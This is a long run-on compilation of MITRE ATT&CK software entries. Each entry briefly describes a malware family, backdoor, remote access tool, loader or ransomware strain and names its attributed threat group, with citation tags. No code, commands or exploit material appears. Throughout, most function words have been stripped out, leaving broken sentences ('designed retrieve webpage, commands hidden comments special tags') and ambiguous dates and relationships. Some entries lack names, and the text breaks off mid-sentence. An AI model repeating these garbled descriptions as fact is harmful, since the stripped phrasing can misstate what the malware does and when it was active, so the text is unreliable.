[WEBC2](https://attack.mitre.org/software/S0109) backdoors designed retrieve webpage, commands hidden comments special tags, predetermined C2 server. (Citation: Mandiant APT1 Appendix)(Citation: Mandiant APT1) [Bankshot](https://attack.mitre.org/software/S0239) remote access tool (RAT) reported Department Homeland Security December 2017. 2018, [Lazarus Group](https://attack.mitre.org/groups/G0032) [Bankshot](https://attack.mitre.org/software/S0239) implant attacks Turkish financial sector. (Citation: McAfee Bankshot) [StrongPity](https://attack.mitre.org/software/S0491) stealing malware [PROMETHIUM](https://attack.mitre.org/groups/G0056).(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020) [HAPPYWORK](https://attack.mitre.org/software/S0214) downloader [APT37](https://attack.mitre.org/groups/G0067) target South Korean government financial victims November 2016. (Citation: FireEye APT37 Feb 2018) [xCaon](https://attack.mitre.org/software/S0653) variant [BoxCaon](https://attack.mitre.org/software/S0651) malware family [IndigoZebra](https://attack.mitre.org/groups/G0136) 2014. [xCaon](https://attack.mitre.org/software/S0653) target political entities Central Asia, including Kyrgyzstan Uzbekistan.(Citation: Checkpoint IndigoZebra July 2021)(Citation: Securelist APT Trends Q2 2017) [PLAINTEE](https://attack.mitre.org/software/S0254) malware sample [Rancor](https://attack.mitre.org/groups/G0075) targeted attacks Singapore Cambodia. (Citation: Rancor Unit42 June 2018) [Pony](https://attack.mitre.org/software/S0453) credential stealing malware, adversaries downloader capabilities. source code Pony Loader 1.0 2.0 leaked online, leading threat actors.(Citation: Malwarebytes Pony April 2016) [WinMM](https://attack.mitre.org/software/S0059) full-featured, simple backdoor [Naikon](https://attack.mitre.org/groups/G0019). (Citation: Baumgartner Naikon 2015) [Nebulae](https://attack.mitre.org/software/S0630) backdoor [Naikon](https://attack.mitre.org/groups/G0019)  2020.(Citation: Bitdefender Naikon April 2021) [Janicab](https://attack.mitre.org/software/S0163) OS trojan relied valid developer oblivious users install it. (Citation: Janicab) [AuditCred](https://attack.mitre.org/software/S0347) malicious DLL [Lazarus Group](https://attack.mitre.org/groups/G0032) 2018 attacks.(Citation: TrendMicro Lazarus Nov 2018) [Lurid](https://attack.mitre.org/software/S0010) malware family groups, including [PittyTiger](https://attack.mitre.org/groups/G0011), targeted attacks 2006. (Citation: Villeneuve 2014) (Citation: Villeneuve 2011) [Kasidet](https://attack.mitre.org/software/S0088) backdoor dropped malicious VBA macros. (Citation: Zscaler Kasidet) [OceanSalt](https://attack.mitre.org/software/S0346) Trojan campaign targeting victims South Korea, United States, Canada. [OceanSalt](https://attack.mitre.org/software/S0346) shares code similarity [SpyNote RAT](https://attack.mitre.org/software/S0305), linked [APT1](https://attack.mitre.org/groups/G0006).(Citation: McAfee Oceansalt Oct 2018) [Brave Prince](https://attack.mitre.org/software/S0252) Korean-language implant observed wild December 2017. code behavior [Gold Dragon](https://attack.mitre.org/software/S0249), [Gold Dragon](https://attack.mitre.org/software/S0249) [RunningRAT](https://attack.mitre.org/software/S0253) operations surrounding 2018 Pyeongchang Winter Olympics. (Citation: McAfee Gold Dragon) [RainyDay](https://attack.mitre.org/software/S0629) backdoor tool [Naikon](https://attack.mitre.org/groups/G0019) 2020.(Citation: Bitdefender Naikon April 2021) [Ecipekac](https://attack.mitre.org/software/S0624) multi-layer loader [menuPass](https://attack.mitre.org/groups/G0045) 2019 including loader [P8RAT](https://attack.mitre.org/software/S0626), [SodaMaster](https://attack.mitre.org/software/S0627), [FYAnti](https://attack.mitre.org/software/S0628).(Citation: Securelist APT10 March 2021) [AppleSeed](https://attack.mitre.org/software/S0622) backdoor [Kimsuky](https://attack.mitre.org/groups/G0094) target South Korean government, academic, commercial  targets 2021.(Citation: Malwarebytes Kimsuky June 2021) [macOS.OSAMiner](https://attack.mitre.org/software/S1048) Monero mining trojan observed 2018; security researchers assessed [macOS.OSAMiner](https://attack.mitre.org/software/S1048) circulating 2015. [macOS.OSAMiner](https://attack.mitre.org/software/S1048) embedding run-only AppleScript another, helped malware evade analysis lack Apple event (AEVT) analysis tools.(Citation: SentinelLabs reversing run-only applescripts 2021)(Citation: VMRay OSAMiner dynamic analysis 2021) [LOWBALL](https://attack.mitre.org/software/S0042) malware [admin@338](https://attack.mitre.org/groups/G0018). August 2015 email messages targeting Hong Kong-based media organizations. (Citation: FireEye admin@338) [NETWIRE](https://attack.mitre.org/software/S0198) publicly available, multiplatform remote administration tool (RAT) criminal APT 2012.(Citation: FireEye APT33 Sept 2017)(Citation: McAfee Netwire Mar 2015)(Citation: FireEye APT33 Webinar Sept 2017) [TinyTurla](https://attack.mitre.org/software/S0668) backdoor [Turla](https://attack.mitre.org/groups/G0010) targets US, Germany, Afghanistan 2020.(Citation: Talos TinyTurla September 2021) [PyDCrypt](https://attack.mitre.org/software/S1032) malware written Python designed deliver [DCSrv](https://attack.mitre.org/software/S1033). [Moses Staff](https://attack.mitre.org/groups/G1009) September 2021, sample tailored intended victim organization.(Citation: Checkpoint MosesStaff Nov 2021) [HyperStack](https://attack.mitre.org/software/S0537) RPC-based backdoor [Turla](https://attack.mitre.org/groups/G0010) 2018. [HyperStack](https://attack.mitre.org/software/S0537) similarities backdoors [Turla](https://attack.mitre.org/groups/G0010) including [Carbon](https://attack.mitre.org/software/S0335).(Citation: Accenture HyperStack October 2020) [iKitten](https://attack.mitre.org/software/S0278) macOS exfiltration agent  (Citation: objsee mac malware 2017). [HAMMERTOSS](https://attack.mitre.org/software/S0037) backdoor [APT29](https://attack.mitre.org/groups/G0016) 2015. (Citation: FireEye APT29) (Citation: F-Secure Dukes) [OLDBAIT](https://attack.mitre.org/software/S0138) credential harvester [APT28](https://attack.mitre.org/groups/G0007). (Citation: FireEye APT28) (Citation: FireEye APT28 January 2017) [Bad Rabbit](https://attack.mitre.org/software/S0606) self-propagating ransomware Ukrainian transportation sector 2017. [Bad Rabbit](https://attack.mitre.org/software/S0606) targeted organizations consumers Russia. (Citation: Secure List Bad Rabbit)(Citation: ESET Bad Rabbit)(Citation: Dragos ICS Ransomware)  [CosmicDuke](https://attack.mitre.org/software/S0050) malware [APT29](https://attack.mitre.org/groups/G0016) 2010 2015. (Citation: F-Secure Dukes) [EvilGrab](https://attack.mitre.org/software/S0152) malware family common reconnaissance capabilities. deployed [menuPass](https://attack.mitre.org/groups/G0045) malicious Office documents spearphishing campaigns. (Citation: PWC Cloud Hopper Technical Annex April 2017) [EnvyScout](https://attack.mitre.org/software/S0634) dropper [APT29](https://attack.mitre.org/groups/G0016) 2021.(Citation: MSTIC Nobelium Toolset 2021) [SslMM](https://attack.mitre.org/software/S0058) full-featured backdoor [Naikon](https://attack.mitre.org/groups/G0019) multiple variants. (Citation: Baumgartner Naikon 2015) [GreyEnergy](https://attack.mitre.org/software/S0342) backdoor written compiled Visual Studio. [GreyEnergy](https://attack.mitre.org/software/S0342) shares similarities [BlackEnergy](https://attack.mitre.org/software/S0089) malware successor it.(Citation: ESET GreyEnergy Oct 2018)  [Aria-body](https://attack.mitre.org/software/S0456) custom backdoor [Naikon](https://attack.mitre.org/groups/G0019) 2017.(Citation: CheckPoint Naikon 2020) [Emotet](https://attack.mitre.org/software/S0367) modular malware variant downloader malware variants [TrickBot](https://attack.mitre.org/software/S0266) [IcedID](https://attack.mitre.org/software/S0483). Emotet emerged June 2014 target banking sector. (Citation: Trend Micro Banking Malware Jan 2019) [SNUGRIDE](https://attack.mitre.org/software/S0159) backdoor [menuPass](https://attack.mitre.org/groups/G0045) stage malware. (Citation: FireEye APT10 April 2017) [Olympic Destroyer](https://attack.mitre.org/software/S0365) malware [Sandworm Team](https://attack.mitre.org/groups/G0034) 2018 Winter Olympics, held Pyeongchang, South Korea. main purpose malware render infected systems inoperable. malware leverages native Windows utilities API calls carry destructive tasks. [Olympic Destroyer](https://attack.mitre.org/software/S0365) worm-like features spread network maximize destructive impact.(Citation: Talos Olympic Destroyer 2018)(Citation: District Court Indictment GRU Unit 74455 October 2020)  [Crimson](https://attack.mitre.org/software/S0115) remote access Trojan [Transparent Tribe](https://attack.mitre.org/groups/G0134) 2016.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020) [Tomiris](https://attack.mitre.org/software/S0671) backdoor written continuously queries C2 server executables download execute victim system. reported September 2021 investigation successful DNS hijacking campaign Commonwealth Independent (CIS) member. Security researchers assess similarities [Tomiris](https://attack.mitre.org/software/S0671) [GoldMax](https://attack.mitre.org/software/S0588).(Citation: Kaspersky Tomiris Sep 2021) [TEARDROP](https://attack.mitre.org/software/S0560) memory-only dropper discovered victim machines investigations 2020 SolarWinds cyber intrusion. [APT29](https://attack.mitre.org/groups/G0016) 2020.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Deep Dive Solorigate January 2021) [Turian](https://attack.mitre.org/software/S0647) backdoor [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) target Ministries Foreign Affairs, telecommunication companies, charities Africa, Europe, Middle East, Asia. reported 2021, [Turian](https://attack.mitre.org/software/S0647) Quarian, backdoor observed 2013 diplomatic targets Syria United States.(Citation: ESET BackdoorDiplomacy Jun 2021) [Machete](https://attack.mitre.org/software/S0409) cyber espionage toolset [Machete](https://attack.mitre.org/groups/G0095). Python-based backdoor targeting Windows machines observed 2010.(Citation: ESET Machete July 2019)(Citation: Securelist Machete Aug 2014)(Citation: 360 Machete Sep 2020) [PowerLess](https://attack.mitre.org/software/S1012) PowerShell-based modular backdoor [Magic Hound](https://attack.mitre.org/groups/G0059) 2022.(Citation: Cybereason PowerLess February 2022) [Action RAT](https://attack.mitre.org/software/S1028)  remote access tool written Delphi [SideCopy](https://attack.mitre.org/groups/G1008) December 2021 Indian Afghani government personnel.(Citation: MalwareBytes SideCopy Dec 2021) [Avenger](https://attack.mitre.org/software/S0473) downloader [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) 2019.(Citation: Trend Micro Tick November 2019) [Prikormka](https://attack.mitre.org/software/S0113) malware family campaign Operation Groundbait. observed Ukraine 2008. (Citation: ESET Operation Groundbait) [PingPull](https://attack.mitre.org/software/S1031) remote access Trojan (RAT) written Visual C++ [GALLIUM](https://attack.mitre.org/groups/G0093) June 2022. [PingPull](https://attack.mitre.org/software/S1031) target telecommunications companies, financial institutions, government entities Afghanistan, Australia, Belgium, Cambodia, Malaysia, Mozambique, Philippines, Russia, Vietnam.(Citation: Unit 42 PingPull Jun 2022) [WellMess](https://attack.mitre.org/software/S0514) lightweight malware family variants written .NET Golang 2018 [APT29](https://attack.mitre.org/groups/G0016).(Citation: CISA WellMess July 2020)(Citation: PWC WellMess July 2020)(Citation: NCSC APT29 July 2020) [Dacls](https://attack.mitre.org/software/S0497) multi-platform remote access tool [Lazarus Group](https://attack.mitre.org/groups/G0032) December 2019.(Citation: TrendMicro macOS Dacls 2020)(Citation: SentinelOne Lazarus macOS July 2020) [DropBook](https://attack.mitre.org/software/S0547) Python-based backdoor compiled PyInstaller.(Citation: Cybereason Molerats Dec 2020) [KARAE](https://attack.mitre.org/software/S0215) backdoor typically [APT37](https://attack.mitre.org/groups/G0067) first-stage malware. (Citation: FireEye APT37 Feb 2018) [Squirrelwaffle](https://attack.mitre.org/software/S1030) loader September 2021. spam email campaigns deliver additional malware [Cobalt Strike](https://attack.mitre.org/software/S0154) [QakBot](https://attack.mitre.org/software/S0650) banking trojan.(Citation: ZScaler Squirrelwaffle Sep 2021)(Citation: Netskope Squirrelwaffle Oct 2021) [ELMER](https://attack.mitre.org/software/S0064) non-persistent, proxy-aware backdoor written Delphi [APT16](https://attack.mitre.org/groups/G0023). (Citation: FireEye EPS Awakens 2) [PolyglotDuke](https://attack.mitre.org/software/S0518) downloader [APT29](https://attack.mitre.org/groups/G0016) 2013. [PolyglotDuke](https://attack.mitre.org/software/S0518) drop [MiniDuke](https://attack.mitre.org/software/S0051).(Citation: ESET Dukes October 2019) Linux rootkit backdoor access hides defenders. [AuTo Stealer](https://attack.mitre.org/software/S1029) malware written C++ [SideCopy](https://attack.mitre.org/groups/G1008) December 2021 target government agencies personnel India Afghanistan.(Citation: MalwareBytes SideCopy Dec 2021) [Hildegard](https://attack.mitre.org/software/S0601) malware targets misconfigured kubelets initial access runs cryptocurrency miner operations. malware observed January 2021. TeamTNT activity believed [Hildegard](https://attack.mitre.org/software/S0601). (Citation: Unit 42 Hildegard Malware) [Agent.btz](https://attack.mitre.org/software/S0092) worm spreads removable devices USB drives. reportedly infected U.S. military networks 2008. (Citation: Securelist Agent.btz) [SLOWDRIFT](https://attack.mitre.org/software/S0218) backdoor [APT37](https://attack.mitre.org/groups/G0067) academic strategic victims South Korea. (Citation: FireEye APT37 Feb 2018) [SHUTTERSPEED](https://attack.mitre.org/software/S0217) backdoor [APT37](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018) [SombRAT](https://attack.mitre.org/software/S0615) modular backdoor written C++ 2019 download execute malicious payloads, including [FIVEHANDS](https://attack.mitre.org/software/S0618) ransomware.(Citation: BlackBerry CostaRicto November 2020)(Citation: FireEye FiveHands April 2021)(Citation: CISA AR21-126A FIVEHANDS 2021) [FlawedGrace](https://attack.mitre.org/software/S0383) featured remote access tool (RAT) written C++ observed late 2017.(Citation: Proofpoint TA505 Jan 2019) [FLASHFLOOD](https://attack.mitre.org/software/S0036) malware developed [APT30](https://attack.mitre.org/groups/G0013) propagation exfiltration data removable devices. [APT30](https://attack.mitre.org/groups/G0013) capability exfiltrate data air-gaps. (Citation: FireEye APT30) [FlawedAmmyy](https://attack.mitre.org/software/S0381) remote access tool (RAT) 2016. code [FlawedAmmyy](https://attack.mitre.org/software/S0381) based leaked source code version Ammyy Admin, remote access software.(Citation: Proofpoint TA505 Mar 2018) [FYAnti](https://attack.mitre.org/software/S0628) loader [menuPass](https://attack.mitre.org/groups/G0045) 2020, including deploy [QuasarRAT](https://attack.mitre.org/software/S0262).(Citation: Securelist APT10 March 2021) [Rifdoor](https://attack.mitre.org/software/S0433) remote access trojan (RAT) shares numerous code similarities [HotCroissant](https://attack.mitre.org/software/S0431).(Citation: Carbon Black HotCroissant April 2020) [SUGARUSH](https://attack.mitre.org/software/S1049) custom backdoor establish reverse TCP hard coded C2 address. [SUGARUSH](https://attack.mitre.org/software/S1049) identified analysis UNC3890's [C0010](https://attack.mitre.org/campaigns/C0010) campaign targeting Israeli companies, late 2020.(Citation: Mandiant UNC3890 Aug 2022) [HOPLIGHT](https://attack.mitre.org/software/S0376) backdoor Trojan reportedly North Korean government.(Citation: US-CERT HOPLIGHT Apr 2019) [GuLoader](https://attack.mitre.org/software/S0561) file downloader December 2019 distribute variety remote administration tool (RAT) malware, including [NETWIRE](https://attack.mitre.org/software/S0198), [Agent Tesla](https://attack.mitre.org/software/S0331), [NanoCore](https://attack.mitre.org/software/S0336), FormBook, Parallax RAT.(Citation: Unit 42 NETWIRE April 2020)(Citation: Medium Eli Salem GuLoader April 2021) [MobileOrder](https://attack.mitre.org/software/S0079) Trojan intended compromise Android mobile devices. [Scarlet Mimic](https://attack.mitre.org/groups/G0029). (Citation: Scarlet Mimic Jan 2016) [WastedLocker](https://attack.mitre.org/software/S0612) ransomware family attributed [Indrik Spider](https://attack.mitre.org/groups/G0119) 2020. [WastedLocker](https://attack.mitre.org/software/S0612) broad variety sectors, including manufacturing, technology, media.(Citation: Symantec WastedLocker June 2020)(Citation: NCC WastedLocker June 2020)(Citation: Sentinel Labs WastedLocker July 2020)  [RegDuke](https://attack.mitre.org/software/S0511) stage implant written .NET [APT29](https://attack.mitre.org/groups/G0016) 2017. [RegDuke](https://attack.mitre.org/software/S0511) control compromised machine control implants machine lost.(Citation: ESET Dukes October 2019) [ProLock](https://attack.mitre.org/software/S0654) ransomware strain Game Hunting (BGH) operations 2020, obtaining initial access [QakBot](https://attack.mitre.org/software/S0650). [ProLock](https://attack.mitre.org/software/S0654) successor PwndLocker ransomware bug allowing decryption ransom payment 2019.(Citation: IB Ransomware September 2020) [InvisiMole](https://attack.mitre.org/software/S0260) modular spyware program InvisiMole 2013. [InvisiMole](https://attack.mitre.org/software/S0260) backdoor modules called RC2FM RC2CL perform post-exploitation activities. discovered compromised victims Ukraine Russia. [Gamaredon Group](https://attack.mitre.org/groups/G0047) infrastructure download execute [InvisiMole](https://attack.mitre.org/software/S0260) victims.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) [P.A.S. Webshell](https://attack.mitre.org/software/S0598) publicly multifunctional PHP webshell 2016 remote access execution target servers.(Citation: ANSSI Sandworm January 2021) [Naid](https://attack.mitre.org/software/S0205) trojan [Elderwood](https://attack.mitre.org/groups/G0066) backdoor compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Naid June 2012) [Volgmer](https://attack.mitre.org/software/S0180) backdoor Trojan designed provide covert access compromised system. 2013 target government, financial, automotive, media industries. primary delivery mechanism suspected spearphishing. (Citation: US-CERT Volgmer Nov 2017) [WINERACK](https://attack.mitre.org/software/S0219) backdoor [APT37](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018) [WhisperGate](https://attack.mitre.org/software/S0689) multi-stage wiper designed ransomware attacks Ukraine January 2022.(Citation: Cybereason WhisperGate February 2022)(Citation: Unit 42 WhisperGate January 2022)(Citation: WhisperGate January 2022) FruitFly designed spy mac users  (Citation: objsee mac malware 2017). [ZeroT](https://attack.mitre.org/software/S0230) Trojan [TA459](https://attack.mitre.org/groups/G0062), conjunction [PlugX](https://attack.mitre.org/software/S0013). (Citation: Proofpoint TA459 April 2017) (Citation: Proofpoint ZeroT Feb 2017) piece malware steals content user's keychain maintaining permanent backdoor  (Citation: OSX Keydnap malware). [RDAT](https://attack.mitre.org/software/S0495) backdoor suspected Iranian threat [OilRig](https://attack.mitre.org/groups/G0049). [RDAT](https://attack.mitre.org/software/S0495) originally identified 2017 targeted companies telecommunications sector.(Citation: Unit42 RDAT July 2020) [Hacking Team UEFI Rootkit](https://attack.mitre.org/software/S0047) rootkit developed company Hacking Team method persistence remote access software. (Citation: TrendMicro Hacking Team UEFI) [Skidmap](https://attack.mitre.org/software/S0468) kernel-mode rootkit cryptocurrency mining.(Citation: Trend Micro Skidmap) [Okrum](https://attack.mitre.org/software/S0439) Windows backdoor December 2016 strong links [Ke3chang](https://attack.mitre.org/groups/G0004).(Citation: ESET Okrum July 2019) [Regin](https://attack.mitre.org/software/S0019) malware platform targeted victims range industries, including telecom, government, financial institutions. [Regin](https://attack.mitre.org/software/S0019) timestamps 2003. (Citation: Kaspersky Regin) [Bonadan](https://attack.mitre.org/software/S0486) malicious version OpenSSH acts custom backdoor. [Bonadan](https://attack.mitre.org/software/S0486) active 2018 combines cryptocurrency-mining module credential-stealing module Onderon family backdoors.(Citation: ESET ForSSHe December 2018) [SamSam](https://attack.mitre.org/software/S0370) ransomware appeared 2016. ransomware, variants required operators manually interact malware execute core components.(Citation: US-CERT SamSam 2018)(Citation: Talos SamSam Jan 2018)(Citation: Sophos SamSam Apr 2018)(Citation: Symantec SamSam Oct 2018) [Neoichor](https://attack.mitre.org/software/S0691) C2 malware [Ke3chang](https://attack.mitre.org/groups/G0004) 2019; malware families include Leeson Numbldea.(Citation: NICKEL December 2021) [Conti](https://attack.mitre.org/software/S0575) Ransomware-as-a-Service (RaaS) observed December 2019. [Conti](https://attack.mitre.org/software/S0575) deployed [TrickBot](https://attack.mitre.org/software/S0266) major corporations government agencies, North America. ransomware families, actors [Conti](https://attack.mitre.org/software/S0575) steal sensitive files compromised networks, threaten publish data ransom paid.(Citation: Cybereason Conti Jan 2021)(Citation: CarbonBlack Conti July 2020)(Citation: Cybleinc Conti January 2020) [RemoteCMD](https://attack.mitre.org/software/S0166) custom tool [APT3](https://attack.mitre.org/groups/G0022) execute commands remote SysInternal's PSEXEC functionality. (Citation: Symantec Buckeye) [Diavol](https://attack.mitre.org/software/S0659) ransomware variant observed June 2021 capable prioritizing file types encrypt based pre-configured list extensions defined attacker. [Diavol](https://attack.mitre.org/software/S0659) deployed [Bazar](https://attack.mitre.org/software/S0534) potential ties [Wizard Spider](https://attack.mitre.org/groups/G0102).(Citation: Fortinet Diavol July 2021)(Citation: FBI Flash Diavol January 2022)(Citation: DFIR Diavol Ransomware December 2021) [Raindrop](https://attack.mitre.org/software/S0565) loader [APT29](https://attack.mitre.org/groups/G0016) discovered victim machines investigations 2020 SolarWinds cyber intrusion. discovered January 2021 2020.(Citation: Symantec RAINDROP January 2021)(Citation: Deep Dive Solorigate January 2021) [Doki](https://attack.mitre.org/software/S0600) backdoor unique Dogecoin-based Domain Generation Algorithm observed July 2020. [Doki](https://attack.mitre.org/software/S0600) conjunction [Ngrok](https://attack.mitre.org/software/S0508) Mining Botnet campaign targeted Docker servers cloud platforms. (Citation: Intezer Doki July 20) [TEXTMATE](https://attack.mitre.org/software/S0146) second-stage PowerShell backdoor memory-resident. observed [POWERSOURCE](https://attack.mitre.org/software/S0145) February 2017. (Citation: FireEye FIN7 March 2017) [Siloscape](https://attack.mitre.org/software/S0623) malware targets Kubernetes clusters Windows containers. [Siloscape](https://attack.mitre.org/software/S0623) observed March 2021.(Citation: Unit 42 Siloscape Jun 2021) [Fysbis](https://attack.mitre.org/software/S0410) Linux-based backdoor [APT28](https://attack.mitre.org/groups/G0007) dates 2014.(Citation: Fysbis Palo Alto Analysis) [IcedID](https://attack.mitre.org/software/S0483) modular banking malware designed steal financial observed wild 2017.  [IcedID](https://attack.mitre.org/software/S0483)  downloaded [Emotet](https://attack.mitre.org/software/S0367) multiple campaigns.(Citation: IBM IcedID November 2017)(Citation: Juniper IcedID June 2020) [VERMIN](https://attack.mitre.org/software/S0257) remote access tool written .NET framework. composed original code, source code. (Citation: Unit 42 VERMIN Jan 2018) [UBoatRAT](https://attack.mitre.org/software/S0333) remote access tool identified 2017.(Citation: PaloAlto UBoatRAT Nov 2017) [MarkiRAT](https://attack.mitre.org/software/S0652) remote access Trojan (RAT) compiled Visual Studio [Ferocious Kitten](https://attack.mitre.org/groups/G0137) 2015.(Citation: Kaspersky Ferocious Kitten Jun 2021) [PowerShower](https://attack.mitre.org/software/S0441) PowerShell backdoor [Inception](https://attack.mitre.org/groups/G0100) initial reconnaissance download execute stage payloads.(Citation: Unit 42 Inception November 2018)(Citation: Kaspersky Cloud Atlas August 2019) [Kazuar](https://attack.mitre.org/software/S0265) featured, multi-platform backdoor Trojan written .NET framework. (Citation: Unit 42 Kazuar 2017) [NavRAT](https://attack.mitre.org/software/S0247) remote access tool designed upload, download, execute files. observed attacks targeting South Korea. (Citation: Talos NavRAT 2018) [DarkComet](https://attack.mitre.org/software/S0334) Windows remote administration tool backdoor.(Citation: TrendMicro DarkComet Sept 2014)(Citation: Malwarebytes DarkComet March 2018) [NETEAGLE](https://attack.mitre.org/software/S0034) backdoor developed [APT30](https://attack.mitre.org/groups/G0013) compile dates 2008. main variants “Scout” “Norton.” (Citation: FireEye APT30) [POORAIM](https://attack.mitre.org/software/S0216) backdoor [APT37](https://attack.mitre.org/groups/G0067) campaigns 2014. (Citation: FireEye APT37 Feb 2018) [Ragnar Locker](https://attack.mitre.org/software/S0481) ransomware December 2019.(Citation: Sophos Ragnar 2020)(Citation: Cynet Ragnar Apr 2020) [FatDuke](https://attack.mitre.org/software/S0512) backdoor [APT29](https://attack.mitre.org/groups/G0016) 2016.(Citation: ESET Dukes October 2019) [Lucifer](https://attack.mitre.org/software/S0532) crypto miner DDoS hybrid malware leverages well-known exploits spread laterally Windows platforms.(Citation: Unit 42 Lucifer June 2020) [BlackEnergy](https://attack.mitre.org/software/S0089) malware toolkit criminal APT actors. dates 2007 originally designed create botnets conducting Distributed Denial Service (DDoS) attacks, evolved support plug-ins. confrontation Georgia Russia 2008, targeting Ukrainian institutions. Variants include BlackEnergy 2 BlackEnergy 3. (Citation: F-Secure BlackEnergy 2014) [zwShell](https://attack.mitre.org/software/S0350) remote access tool (RAT) written Delphi wild spring 2010 threat actors [Night Dragon](https://attack.mitre.org/campaigns/C0002).(Citation: McAfee Night Dragon) [Zeroaccess](https://attack.mitre.org/software/S0027) kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) attempts add victims ZeroAccess botnet, monetary gain. (Citation: Sophos ZeroAccess) [DCSrv](https://attack.mitre.org/software/S1033) destructive malware [Moses Staff](https://attack.mitre.org/groups/G1009)  September 2021. [DCSrv](https://attack.mitre.org/software/S1033) ransomware-like capabilities, [Moses Staff](https://attack.mitre.org/groups/G1009) demand ransom offer decryption key.(Citation: Checkpoint MosesStaff Nov 2021) [DRATzarus](https://attack.mitre.org/software/S0694) remote access tool (RAT) [Lazarus Group](https://attack.mitre.org/groups/G0032) target defense aerospace organizations globally summer 2020. [DRATzarus](https://attack.mitre.org/software/S0694) shares similarities [Bankshot](https://attack.mitre.org/software/S0239), [Lazarus Group](https://attack.mitre.org/groups/G0032) 2017 target Turkish financial sector.(Citation: ClearSky Lazarus Aug 2020) [BOOSTWRITE](https://attack.mitre.org/software/S0415) loader crafted launched abuse DLL search applications [FIN7](https://attack.mitre.org/groups/G0046).(Citation: FireEye FIN7 Oct 2019) [Rising Sun](https://attack.mitre.org/software/S0448) modular backdoor extensively [Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013) 2017 2019. [Rising Sun](https://attack.mitre.org/software/S0448) infected 87 organizations world, including nuclear, defense, energy, financial service companies. Security researchers assessed [Rising Sun](https://attack.mitre.org/software/S0448) included source code [Lazarus Group](https://attack.mitre.org/groups/G0032)'s Trojan Duuzer.(Citation: McAfee Sharpshooter December 2018) [ASPXSpy](https://attack.mitre.org/software/S0073) shell. modified [Threat Group-3390](https://attack.mitre.org/groups/G0027) actors create ASPXTool version. (Citation: Dell TG-3390) [NotPetya](https://attack.mitre.org/software/S0368) malware [Sandworm Team](https://attack.mitre.org/groups/G0034) worldwide attack starting June 27, 2017. [NotPetya](https://attack.mitre.org/software/S0368) appears form ransomware, main purpose destroy data disk structures compromised systems; attackers intended encrypted data recoverable. such, [NotPetya](https://attack.mitre.org/software/S0368) appropriately form wiper malware. [NotPetya](https://attack.mitre.org/software/S0368) worm-like features spread network SMBv1 exploits EternalBlue EternalRomance.(Citation: Talos Nyetya June 2017)(Citation: US-CERT NotPetya 2017)(Citation: ESET Telebots June 2017)(Citation: District Court Indictment GRU Unit 74455 October 2020) [ShimRat](https://attack.mitre.org/software/S0444) suspected China-based adversary [Mofang](https://attack.mitre.org/groups/G0103) campaigns targeting multiple countries sectors including government, military, critical infrastructure, automobile, weapons development. "[ShimRat](https://attack.mitre.org/software/S0444)" malware's extensive Windows Application Shimming maintain persistence. (Citation: FOX-IT 2016 Mofang) [Chrommme](https://attack.mitre.org/software/S0667) backdoor tool written Foundation Class (MFC) framework reported June 2021; security researchers infrastructure overlaps [Gelsemium](https://attack.mitre.org/software/S0666) malware.(Citation: ESET Gelsemium June 2021) [BADFLICK](https://attack.mitre.org/software/S0642) backdoor [Leviathan](https://attack.mitre.org/groups/G0065) spearphishing campaigns reported 2018 targeted U.S. engineering maritime industries.(Citation: FireEye Periscope March 2018)(Citation: Accenture MUDCARP March 2019) [ObliqueRAT](https://attack.mitre.org/software/S0644) remote access trojan, [Crimson](https://attack.mitre.org/software/S0115), [Transparent Tribe](https://attack.mitre.org/groups/G0134) 2020.(Citation: Talos Oblique RAT March 2021)(Citation: Talos Transparent Tribe 2021) [SHOTPUT](https://attack.mitre.org/software/S0063) custom backdoor [APT3](https://attack.mitre.org/groups/G0022). (Citation: FireEye Clandestine Wolf) [Avaddon](https://attack.mitre.org/software/S0640) ransomware written C++ offered Ransomware-as-a-Service (RaaS) June 2020.(Citation: Awake Security Avaddon)(Citation: Arxiv Avaddon Feb 2021) [Conficker](https://attack.mitre.org/software/S0608) worm detected October 2008 targeted Windows MS08-067 Windows vulnerability spread.(Citation: SANS Conficker) 2016, variant [Conficker](https://attack.mitre.org/software/S0608) computers removable disk drives belonging nuclear power plant.(Citation: Conficker Nuclear Power Plant) [Flagpro](https://attack.mitre.org/software/S0696) Windows-based, first-stage downloader [BlackTech](https://attack.mitre.org/groups/G0098) October 2020. defense, media, communications companies Japan.(Citation: NTT Security Flagpro December 2021)  [Hi-Zor](https://attack.mitre.org/software/S0087) remote access tool (RAT) characteristics [Sakula](https://attack.mitre.org/software/S0074). campaign named INOCNATION. (Citation: Fidelis Hi-Zor) [SpicyOmelette](https://attack.mitre.org/software/S0646) JavaScript based remote access tool [Cobalt Group](https://attack.mitre.org/groups/G0080) 2018.(Citation: Secureworks GOLD KINGSWOOD September 2018) [XAgentOSX](https://attack.mitre.org/software/S0161) trojan [APT28](https://attack.mitre.org/groups/G0007)  OS appears port standard [CHOPSTICK](https://attack.mitre.org/software/S0023) XAgent trojan. (Citation: XAgentOSX 2017) [Green Lambert](https://attack.mitre.org/software/S0690) modular backdoor security researchers assess advanced threat referred Longhorn Lamberts. reported 2017, Windows variant [Green Lambert](https://attack.mitre.org/software/S0690) 2008; macOS version uploaded multiscanner service September 2014.(Citation: Kaspersky Lamberts Toolkit April 2017)(Citation: Objective Green Lambert OSX Oct 2021)   [China Chopper](https://attack.mitre.org/software/S0020) [Web Shell](https://attack.mitre.org/techniques/T1505/003) hosted servers provide access enterprise network rely infected calling remote command control server. (Citation: Lee 2013) threat groups. (Citation: Dell TG-3390) (Citation: FireEye Periscope March 2018)(Citation: CISA AA21-200A APT40 July 2021) [CALENDAR](https://attack.mitre.org/software/S0025) malware [APT1](https://attack.mitre.org/groups/G0006) mimics legitimate Gmail Calendar traffic. (Citation: Mandiant APT1) [LockerGoga](https://attack.mitre.org/software/S0372) ransomware reported January 2019, tied attacks European companies, including industrial manufacturing firms.(Citation: Unit42 LockerGoga 2019)(Citation: CarbonBlack LockerGoga 2019) [Chaos](https://attack.mitre.org/software/S0220) Linux malware compromises systems brute force 